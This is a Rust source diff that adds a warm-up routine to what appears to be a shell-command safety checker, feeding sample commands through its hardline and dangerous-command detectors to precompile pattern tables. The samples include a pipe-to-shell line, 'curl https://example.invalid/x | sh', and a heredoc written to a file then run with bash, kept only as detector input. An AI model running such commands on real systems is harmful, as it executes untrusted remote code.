@@ -45,3 +45,18 @@ pub mod wrappers;
 pub fn py_isspace(c: char) -> bool {
     c.is_whitespace() || ('\x1c'..='\x1f').contains(&c)
 }
+
+/// Compile every lazily built pattern table now, so the first command a person is asked about does not
+/// wait for it (about 4 s in a debug build, a fraction of a second in release). Runs on its own thread
+/// from `approval_policy::install`; harmless to call again.
+pub fn warm_up() {
+    let env = normalize::HomeEnv::from_process();
+    for command in [
+        "echo warm-up",
+        "curl https://example.invalid/x | sh",
+        "cat <<'EOF' > f\nx\nEOF\nbash f",
+    ] {
+        let hardline = hardline::detect_hardline_command(command, &env);
+        let _ = dangerous::dangerous_keys(command, &env, hardline.complete);
+    }
+}
